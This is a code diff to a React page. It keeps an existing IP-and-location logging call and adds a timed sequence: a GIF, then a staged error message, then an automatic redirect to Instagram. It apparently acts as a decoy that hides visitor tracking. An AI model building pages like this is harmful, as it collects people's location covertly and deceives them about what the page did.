@@ -4,6 +4,7 @@ import styles from "./page.module.css";
 
 export default function Home() {
   const [showGif, setShowGif] = useState(true);
+  const [showError, setShowError] = useState(false);
 
   useEffect(() => {
     async function logIPandLocation() {
@@ -34,12 +35,20 @@ export default function Home() {
 
     logIPandLocation();
 
-    const timer = setTimeout(() => {
-      setShowGif(false);
-    }, 2000);
-
-    return () => clearTimeout(timer);
-  }, []);
+       // Mostrar GIF 2 segundos
+       const gifTimer = setTimeout(() => {
+        setShowGif(false);
+        setShowError(true);
+  
+        // Mostrar Error 1 segundo y luego redirigir
+        setTimeout(() => {
+          window.location.href = 'https://www.instagram.com/';
+        }, 1000);
+  
+      }, 2000);
+  
+      return () => clearTimeout(gifTimer);
+    }, []);
 
   return (
     <>
